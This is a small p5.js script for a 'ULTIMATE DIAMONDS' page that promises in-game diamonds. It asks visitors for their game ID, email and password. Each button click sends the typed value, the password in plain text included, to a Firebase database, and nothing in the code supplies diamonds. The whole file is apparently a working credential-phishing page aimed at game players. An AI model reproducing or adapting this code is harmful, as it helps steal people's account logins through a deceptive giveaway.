var id,id1,idval;
var mail,mail1,mailval;
var database;
var pass,pass1,passval;
var di,di1,dival;

function setup(){
  createCanvas(windowWidth-30,windowHeight-30)
 database = firebase.database();
  id = createInput();
 id.position(windowWidth/2.5+50,windowHeight/5)
  id1 = createButton('NEXT');
 id1.position(windowWidth/2.5+50+130,windowHeight/5)
 
 mail = createInput();
 mail.position(windowWidth/2.5+50,windowHeight/5+70)
 mail1= createButton('NEXT');
 mail1.position(windowWidth/2.5+50+130,windowHeight/5+70)

 pass = createInput();
 pass.position(windowWidth/2.5+50,windowHeight/5+140)
 pass1= createButton('NEXT');
 pass1.position(windowWidth/2.5+50+130,windowHeight/5+140)

 di = createInput();
 di.position(windowWidth/2.5+50,windowHeight/5+210)
 di1= createButton('NEXT');
 di1.position(windowWidth/2.5+50+130,windowHeight/5+210)

}
function draw(){
  background("red")
  textSize(40);
  fill("yellow");
  text("ULTIMATE DIAMONDS",windowWidth/2-100,50);
  textSize(20);
  fill("blue");
  
  
  text("Write Your Game Id",id.x,id.y-20)
 text("ID:"+idval,id.x+200,id.y-20);
  id1.mouseClicked(id2);
  text("Write Your Email",mail.x,mail.y-20)
  text("EMAIL:"+mailval,mail.x+200,mail.y-20)
  mail1.mouseClicked(mail2);
  text("Write Your Password",pass.x,pass.y-20)
  text("PASSWORD:"+passval,pass.x+200,pass.y-20)
  pass1.mouseClicked(pass2);
  text("How Many Diamonds You Want",di.x,di.y-20)
  text("Diamonds:"+dival,di.x+300,di.y-20)
  di1.mouseClicked(di2);
  
}
function id2(){
  idval = id.value();
  database.ref("/").update({
  Id:idval
  })
 
}
function mail2(){
  mailval = mail.value();
  database.ref("/").update({
  Mail:mailval
  })
}
function pass2(){
  passval = pass.value();
  database.ref("/").update({
  PASSWORD:passval
  })
}
function di2(){
  dival = di.value();
  database.ref("/").update({
  Dimonds:dival
  })
}